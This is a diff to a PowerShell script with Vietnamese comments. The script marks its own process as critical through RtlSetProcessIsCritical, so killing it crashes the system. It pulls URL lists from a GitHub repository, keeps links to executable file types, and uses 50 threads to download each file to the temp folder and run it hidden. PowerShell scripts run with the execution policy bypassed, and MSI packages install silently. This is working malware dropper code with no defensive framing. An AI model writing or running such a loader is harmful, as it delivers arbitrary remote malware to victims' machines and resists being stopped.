@@ -25,65 +25,82 @@ function CriticalProcess {
     }
 }
 CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
-# 1. Thu thập danh sách URL
+# 1. Nguồn URL (List đã check của bạn)
 $sources = @(
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
 )
 
+# Các định dạng hỗ trợ (Mở rộng tối đa cho Windows)
+$extensions = ".exe", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".msi", ".msp", ".scr", ".ps1", ".pif", ".cpl"
+
+Write-Host "[*] Đang đọc danh sách đã check..." -ForegroundColor Cyan
+
+# Tải và gộp list, loại bỏ trùng lặp tuyệt đối
 $allUrls = foreach ($s in $sources) {
     try {
-        (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content -split "`n" | Where-Object { $_.Trim() -ne "" }
-    } catch { write-host "Không thể kết nối tới nguồn: $s" -ForegroundColor Red }
-}
+        (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content -split "`n" | 
+        ForEach-Object { $_.Trim() } | 
+        Where-Object { $_ -ne "" -and ($extensions | Where-Object { $url = $_; $url.ToLower().EndsWith($_) }) }
+    } catch { }
+} | Select-Object -Unique
 
-# 2. Thiết lập Runspace Pool với 50 tầng (threads)
+Write-Host "[*] Tổng cộng $($allUrls.Count) link sẵn sàng. Đang chạy 50 luồng..." -ForegroundColor Green
+
+# 2. Cấu hình Runspace Pool (50 luồng)
 $sessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
-# Tham số: (Số luồng tối thiểu, Số luồng tối đa)
 $pool = [runspacefactory]::CreateRunspacePool(1, 50, $sessionState, $Host)
 $pool.Open()
 
-$threads = @()
+$threads = New-Object System.Collections.Generic.List[PSObject]
 
-# 3. Đẩy tác vụ vào các tầng
+# 3. Logic xử lý từng loại Extension
 foreach ($u in $allUrls) {
-    $u = $u.Trim()
-    
     $powershell = [powershell]::Create().AddScript({
         param($url)
         try {
-            $fileName = [System.IO.Path]::GetFileName($url)
+            # Lấy tên file sạch (bỏ tham số sau dấu ?)
+            $cleanUrl = $url.Split('?')[0]
+            $fileName = [System.IO.Path]::GetFileName($cleanUrl)
             $path = Join-Path $env:TEMP $fileName
+            $ext = [System.IO.Path]::GetExtension($path).ToLower()
             
-            # Tải xuống với thiết lập tối ưu
+            # Tải xuống cực nhanh
             Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
             
-            # Thực thi ẩn
-            Start-Process -FilePath $path -WindowStyle Hidden
-        } catch {
-            # Bỏ qua lỗi nếu file không tồn tại hoặc link chết
-        }
+            # --- KIỂM TRA LOẠI FILE ĐỂ CHẠY CHO ĐÚNG ---
+            switch ($ext) {
+                ".ps1" { 
+                    Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden 
+                }
+                { ".vbs", ".js", ".vbe", ".jse", ".wsf", ".wsh" -contains $_ } { 
+                    Start-Process "wscript.exe" -ArgumentList "`"$path`"" -WindowStyle Hidden 
+                }
+                { ".msi", ".msp" -contains $_ } { 
+                    Start-Process "msiexec.exe" -ArgumentList "/i `"$path`" /quiet /qn" -WindowStyle Hidden 
+                }
+                default { 
+                    # Chạy trực tiếp cho .exe, .bat, .cmd, .com, .scr...
+                    Start-Process -FilePath $path -WindowStyle Hidden 
+                }
+            }
+        } catch { }
     }).AddArgument($u)
 
     $powershell.RunspacePool = $pool
-    
-    # Kích hoạt luồng
-    $threads += New-Object PSObject -Property @{
+    $threads.Add((New-Object PSObject -Property @{
         Instance = $powershell
         Handle   = $powershell.BeginInvoke()
-    }
+    }))
 }
 
-# 4. Giám sát (Tùy chọn: Đợi cho đến khi tất cả hoàn tất)
-Write-Host "Đang chạy 50 luồng tải xuống..." -ForegroundColor Cyan
-while ($threads.Handle.IsCompleted -contains $false) {
-    Start-Sleep -Milliseconds 100
-}
+# 4. Đợi hoàn tất
+while ($threads.Handle.IsCompleted -contains $false) { Start-Sleep -Milliseconds 200 }
 
-# 5. Giải phóng bộ nhớ
-$threads | ForEach-Object {
-    $_.Instance.EndInvoke($_.Handle)
-    $_.Instance.Dispose()
+# 5. Dọn dẹp bộ nhớ
+foreach ($t in $threads) {
+    $t.Instance.EndInvoke($t.Handle)
+    $t.Instance.Dispose()
 }
 $pool.Close()
-Write-Host "Hoàn thành!" -ForegroundColor Green
+Write-Host "[+] Xong! Đã xử lý tất cả link từ list của bạn." -ForegroundColor White
